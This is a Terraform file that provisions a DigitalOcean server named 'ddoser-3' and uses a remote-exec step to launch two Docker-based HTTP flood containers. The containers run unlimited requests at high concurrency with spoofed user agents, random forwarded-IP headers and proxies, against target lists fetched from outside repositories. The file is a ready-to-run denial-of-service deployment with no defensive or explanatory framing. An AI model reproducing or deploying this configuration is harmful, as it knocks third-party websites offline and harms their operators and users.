resource "digitalocean_droplet" "ddoser-3" {
  image = "docker-20-04"
  name = "ddoser-3"
  region = "ams3"
  size = "s-1vcpu-1gb"
  ssh_keys = [
    data.digitalocean_ssh_key.wiki.id
  ]
  
  connection {
    host = self.ipv4_address
    user = "root"
    type = "ssh"
    private_key = file(var.pvt_key)
    timeout = "2m"
  }
  
  provisioner "remote-exec" {
    inline = [
        "docker run -d --pull always --ulimit nofile=100000:100000 -it imsamurai/ddoser --concurrency 150 --timeout 60 --with-random-get-param --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets3.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip",
        "docker run -d --pull always --ulimit nofile=100000:100000 -it imsamurai/ddoser --concurrency 150 --timeout 60 --with-random-get-param --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip"
]
  }
}
